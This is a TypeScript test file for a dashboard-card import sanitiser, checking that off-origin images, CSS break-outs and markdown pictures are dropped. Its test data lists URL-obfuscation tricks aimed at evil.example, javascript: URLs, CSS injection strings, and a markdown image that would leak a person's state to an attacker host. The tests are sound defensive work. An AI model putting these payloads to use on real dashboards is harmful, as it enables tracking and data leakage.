import { describe, expect, it } from 'vitest';
import { cardKeyLists } from '../src/editor/transfer-loader';
import { createShareKit } from '../src/share-kit/chunk';
import { sameOriginRelative, strictValue, urlLike } from '../src/share-kit/strict';
import { shareKitHelpers } from '../src/transfer/share-kit-loader';
import type { TransferNote } from '../src/contracts/preset-transfer';

const kit = createShareKit(shareKitHelpers);
const lists = cardKeyLists();
const base = { type: 'custom:magic-card' };
const M = 'data.rows[0].columns[0].modules[0]';
const mod = (m: Record<string, unknown>, card: Record<string, unknown> = {}) => ({ ...base, rows: [{ id: 'r', columns: [{ id: 'c', modules: [{ id: 'm', ...m }] }] }], ...card });
const read = (data: unknown, l = lists) => kit.readCard(0, data, l);
const kept = (data: unknown) => {
  const r = read(data);
  if (!r.ok) throw new Error(`refused: ${JSON.stringify(r)}`);
  return r;
};
const first = (r: ReturnType<typeof kept>) => (r.data.rows[0].columns[0].modules[0] as unknown) as Record<string, unknown>;
const noteAt = (notes: TransferNote[], path: string) => notes.find((n) => n.path === path);

const FORMS = [
  '//evil.example/x.png',
  '\\\\evil.example/x.png',
  '/\\evil.example/x.png',
  '\\/evil.example/x.png',
  '/\t/evil.example/x.png',
  '/\n/evil.example/x.png',
  'https:evil.example/x.png',
  'ht\ntps://evil.example/x.png',
  'h\ttp://evil.example/x.png',
  '\u0001//evil.example/x.png',
  ' \u0001https://evil.example/x.png',
  'https://evil.example/x.png',
  'HTTP://evil.example/x.png',
  'http:\\\\evil.example\\x.png',
  'ftp://evil.example/x.png',
  'javascript:alert(1)',
  'data:image/svg+xml;base64,PHN2Zz48L3N2Zz4=',
  'data:text/html;base64,PGI+',
];

describe('same-origin check by the real parser', () => {
  it.each(FORMS)('does not read %j as a path on this origin', (v) => {
    expect(urlLike(v)).toBe(true);
    expect(sameOriginRelative(v)).toBe(false);
  });
  it.each(['/local/a.png', '/api/image/serve/x/512x512', '/local/a b.png', 'x.png', '../a.png', '?a=1', '#top'])('reads %j as a path on this origin', (v) => {
    expect(sameOriginRelative(v)).toBe(true);
  });
  it('does not take an icon id or a sentence for a URL', () => {
    for (const v of ['mdi:lightbulb', 'phu:bulb-group', 'Note: it works', 'Today', '10:30', 'sensor.kitchen']) expect(urlLike(v), v).toBe(false);
  });
});

describe('every image-taking key drops what is not on this origin (security R-1, R-2; reviewer R-1, R-2; senior R-1, R-2)', () => {
  const keys: [string, string][] = [['image', 'image'], ['image', 'entity_picture'], ['video-bg', 'poster'], ['video-bg', 'url'], ['text', 'icon'], ['text', 'whatever_key']];
  for (const [type, key] of keys) {
    it.each(FORMS)(`${type}.${key}: drops %j`, (v) => {
      const r = kept(mod({ type: type === 'text' ? 'info' : type, [key]: v }));
      const m = first(r);
      if (key === 'whatever_key') expect(m).toEqual({ id: 'm', type: 'info' });
      else expect(m).not.toHaveProperty(key);
      const note = noteAt(r.notes, `${M}.${key}`);
      expect(note, JSON.stringify(r.notes)).toBeTruthy();
      expect(JSON.stringify(r.notes)).not.toContain('x.png');
    });
  }
  it('names the rule id and the path in the note text', () => {
    const r = kept(mod({ type: 'video-bg', poster: 'https://evil.example/x.png' }));
    const n = noteAt(r.notes, `${M}.poster`)!;
    expect(n).toMatchObject({ code: 'dropped_value', rule: 'strict.host', hosts: ['evil.example'] });
    expect(n.message).toContain('strict.host');
    expect(n.message).toContain(`${M}.poster`);
  });
  it('keeps /local/, a path on this origin and a raster data: image', () => {
    const png = 'data:image/png;base64,AAAA';
    const r = kept(mod({ type: 'video-bg', poster: '/local/p.png', url: '/api/x' }));
    expect(first(r)).toMatchObject({ poster: '/local/p.png', url: '/api/x' });
    expect(first(kept(mod({ type: 'image', image: png })))).toMatchObject({ image: png });
  });
  it('keeps an icon id', () => {
    expect(first(kept(mod({ type: 'icon', icon: 'mdi:lightbulb' })))).toMatchObject({ icon: 'mdi:lightbulb' });
  });
});

describe('colour keys take no path (security R-1, reviewer R-1)', () => {
  it.each(['//evil.example/x.png', '/api/x.png', '/local/x.png', '\\\\evil.example', 'a/b', 'evil.example', 'https://evil.example/x.png'])('colour refuses %j', (v) => {
    expect(strictValue(v, ['colour']).verdict).not.toBe('kept');
    expect(strictValue(v, ['colour', 'gradient']).verdict).not.toBe('kept');
  });
  it('keeps colours with a slash inside a function', () => {
    for (const v of ['red', '#fff', 'rgb(0 0 0 / 50%)', 'calc(10px / 2)', 'color-mix(in srgb, red 50%, blue)']) expect(strictValue(v, ['colour']).verdict, v).toBe('kept');
  });
  it('drops background_image at card level, in design and in a module design', () => {
    const v = '//evil.example/x.png';
    const r = kept(mod({ type: 'text', design: { background_image: v } }, { background_image: v, hover: { background_image: v } }));
    expect(r.data).not.toHaveProperty('background_image');
    expect(first(r)).toEqual({ id: 'm', type: 'text', design: {} });
    for (const p of ['data.background_image', 'data.hover.background_image', `${M}.design.background_image`]) expect(noteAt(r.notes, p), p).toMatchObject({ rule: 'strict.host' });
  });
  it('keeps a bare /local/ background image with a note', () => {
    const r = kept({ ...base, rows: [], background_image: '/local/bg.png' });
    expect(r.data.background_image).toBe('/local/bg.png');
    expect(r.notes.map((n) => n.code)).toContain('local_path');
  });
});

describe('untyped and card-level style strings (security R-4, reviewer R-3)', () => {
  it('refuses a break-out marker in an untyped design key, a card key and a module key', () => {
    const bad = "none; background-image: image-set('https://evil.example/x.png')";
    expect(read(mod({ type: 'text', design: { box_shadow: bad } }))).toMatchObject({ ok: false, refusal: { rule: 'strict.marker', path: `${M}.design.box_shadow` } });
    expect(read({ ...base, rows: [], list_style: bad })).toMatchObject({ ok: true });
    expect(read(mod({ type: 'bar', bar_color: bad }))).toMatchObject({ ok: false, refusal: { rule: 'strict.marker', path: `${M}.bar_color` } });
    expect(read({ ...base, rows: [], theme: bad })).toMatchObject({ ok: false, refusal: { rule: 'strict.marker', path: 'data.theme' } });
  });
  it.each([
    'image-set("https://evil.example/x.png" 1x)',
    "-webkit-image-set('//evil.example/x.png' 1x)",
    'cross-fade(url(/local/a.png), url(https://evil.example/b.png), 50%)',
    'src("https://evil.example/x.png")',
    'element(#a)',
    'attr(data-x url)',
    'foo(1)',
    'url("https://evil.example/x.png")',
    'url(//evil.example/x.png)',
  ])('drops the untyped design value %j', (v) => {
    const r = kept(mod({ type: 'text', design: { list_style_image: v, cursor: v } }));
    expect(first(r)).toEqual({ id: 'm', type: 'text', design: {} });
    expect(noteAt(r.notes, `${M}.design.list_style_image`)).toMatchObject({ code: 'dropped_value' });
    expect(JSON.stringify(r.notes)).not.toContain('x.png');
  });
  it('refuses a backslash address in an untyped design key', () => {
    expect(read(mod({ type: 'text', design: { cursor: 'url(\\\\evil.example/x.png)' } }))).toMatchObject({ ok: false, refusal: { rule: 'strict.marker' } });
  });
  it('keeps a colour, gradient and calc function in an untyped design key', () => {
    const d = { list_style_image: 'linear-gradient(red, blue)', cursor: 'pointer', outline: 'calc(1px + 2px) solid rgb(0 0 0 / 50%)' };
    expect(first(kept(mod({ type: 'text', design: d })))).toMatchObject({ design: d });
  });
  it('refuses a function with a quote in an untyped design key', () => {
    const r = kept(mod({ type: 'text', design: { outline: 'var(--x, "a")' } }));
    expect(first(r)).toEqual({ id: 'm', type: 'text', design: {} });
  });
});

describe('markdown content pictures (security R-3, reviewer R-4)', () => {
  const content = (c: string) => kept(mod({ type: 'markdown', content: c }));
  it.each([
    '<img src="https://evil.example/x.png">',
    '<IMG SRC=https://evil.example/x.png>',
    '<img\nsrc="//evil.example/x.png">',
    '<img src="https://evil.example/x.png',
    '<img src=x srcset="https://evil.example/x.png 1x">',
    '![a](https://evil.example/y.png?d={{ states("person.a") }})',
    '![a](//evil.example/y.png)',
    '![a](<https://evil.example/y.png>)',
    '![a][r]\n\n[r]: https://evil.example/y.png',
    '<picture><source srcset="https://evil.example/x.png"><img src="https://evil.example/y.png"></picture>',
    '<div style="background:url(https://evil.example/x.png)">x</div>',
    '![![a](https://evil.example/y.png)](/local/b.png)',
  ])('removes the picture in %j and lists it', (c) => {
    const r = content(`Hello ${c} end`);
    const text = (first(r) as { content: string }).content;
    expect(text).toContain('Hello');
    expect(text).not.toMatch(/evil\.example/);
    expect(text).not.toMatch(/<\s*img|!\[/i);
    const n = noteAt(r.notes, `${M}.content`)!;
    expect(n, JSON.stringify(r.notes)).toMatchObject({ code: 'dropped_value', rule: 'strict.host' });
    expect(n.message).toContain('strict.host');
    expect(n.message).toContain(`${M}.content`);
  });
  it('lists the host of a removed picture', () => {
    expect(noteAt(content('![a](https://evil.example/y.png)').notes, `${M}.content`)).toMatchObject({ hosts: ['evil.example'] });
  });
  it('keeps text, links and pictures from /local/ or a raster data: image', () => {
    const c = 'Hi [link](https://example.com) ![a](/local/a.png) <img src="data:image/png;base64,AAAA"> {{ states("sensor.a") }}';
    const r = content(c);
    expect((first(r) as { content: string }).content).toBe(c);
    expect(noteAt(r.notes, `${M}.content`)).toBeUndefined();
  });
});

describe('plain text and actions stay as written', () => {
  it('keeps text that looks like a URL, a label and an action link', () => {
    const r = kept(mod({ type: 'text', text: 'https://example.com/a?b=1; <b>x</b> @home', actions: { tap_action: { action: 'url', url_path: 'https://example.com/@me' } } }));
    expect(first(r)).toMatchObject({ text: 'https://example.com/a?b=1; <b>x</b> @home', actions: { tap_action: { action: 'url', url_path: 'https://example.com/@me' } } });
    expect(first(kept(mod({ type: 'button', label: '//not a link' })))).toMatchObject({ label: '//not a link' });
  });
});

describe('card-mod values in a card (security: card-mod, reviewer R-5)', () => {
  it('drops card-mod-* keys in design and in css and lists them with the rule id', () => {
    const v = "background: image-set('https://evil.example/x.png')";
    const r = kept({ ...base, rows: [], hover: { 'card-mod-card': v, color: 'red' }, css: 'card-mod-card: x; color: red' });
    expect((r.data as { hover: object }).hover).toEqual({ color: 'red' });
    expect(r.data.css).toBe('color: red');
    for (const p of ['data.hover.card-mod-card', 'data.css.card-mod-card']) {
      const n = noteAt(r.notes, p)!;
      expect(n, p).toMatchObject({ code: 'dropped_value', rule: 'strict.card-mod' });
      expect(n.message).toContain('strict.card-mod');
      expect(n.message).toContain(p);
    }
  });
});

describe('prototype keys and thrown errors (security R-6)', () => {
  it.each(['toString', 'constructor', '__proto__', 'hasOwnProperty', 'valueOf'])('a design key %s is read as untyped', (k) => {
    const data = JSON.parse(`{"type":"custom:magic-card","rows":[],"hover":{"${k}":"x"},"design":{"${k}":3}}`);
    expect(read(data)).toMatchObject({ ok: true });
  });
  it('does not throw for lists built from a plain object', () => {
    const plain = { ...lists, designTypes: { ...lists.designTypes } as Record<string, never> };
    expect(read(JSON.parse('{"type":"custom:magic-card","rows":[],"hover":{"toString":"x"},"design":{"toString":4}}'), plain)).toMatchObject({ ok: true });
  });
  it('turns a throw into a refusal that names the path and a rule', () => {
    const broken = { ...lists, get designTypes(): never { throw new Error('boom'); } };
    expect(read({ ...base, rows: [], hover: { color: 'red' } }, broken)).toMatchObject({ ok: false, refusal: { item: 0, path: 'data', rule: 'strict.any' } });
  });
});

describe('drop messages name the rule id and the path (senior R-5)', () => {
  it('names both on unknown card keys, module keys and module types', () => {
    const r = kept(mod({ type: 'text', evil: 1 }, { pwn: 1, rows_extra: [] }));
    for (const [p, rule] of [['data.pwn', 'strict.key'], [`${M}.evil`, 'strict.key']] as const) {
      const n = noteAt(r.notes, p)!;
      expect(n.message, p).toContain(rule);
      expect(n.message, p).toContain(p);
    }
    const gone = kept(mod({ type: 'rocket' }));
    const n = noteAt(gone.notes, M)!;
    expect(n.message).toContain('strict.module');
    expect(n.message).toContain(M);
  });
  it('names both on a dropped action, a style line and a typed value', () => {
    const a = kept(mod({ type: 'text', actions: { tap_action: { action: 'url', url_path: 'javascript:alert(1)' } } }));
    const n = noteAt(a.notes, `${M}.actions.tap_action`)!;
    expect(n.message).toContain('strict.action-url');
    expect(n.message).toContain(`${M}.actions.tap_action`);
    const c = kept({ ...base, rows: [], css: '9bad: 1; color: foo(1)', border_radius: 'foo(1)' });
    for (const p of ['data.css[0]', 'data.css.color', 'data.border_radius']) {
      const m = noteAt(c.notes, p)!;
      expect(m, p).toBeTruthy();
      expect(m.message, p).toContain(p);
      expect(m.message, p).toMatch(/strict\.\w+/);
    }
  });
});

describe('free-form css comment opener (senior R-6)', () => {
  it('drops a value with /* instead of keeping it', () => {
    const r = kit.checkCss(0, 'data.css', 'transform: rotate(3deg) /* ; color: red');
    expect(r.ok && r.css).not.toContain('/*');
    expect(r.ok && r.css).not.toContain('color: red');
  });
});
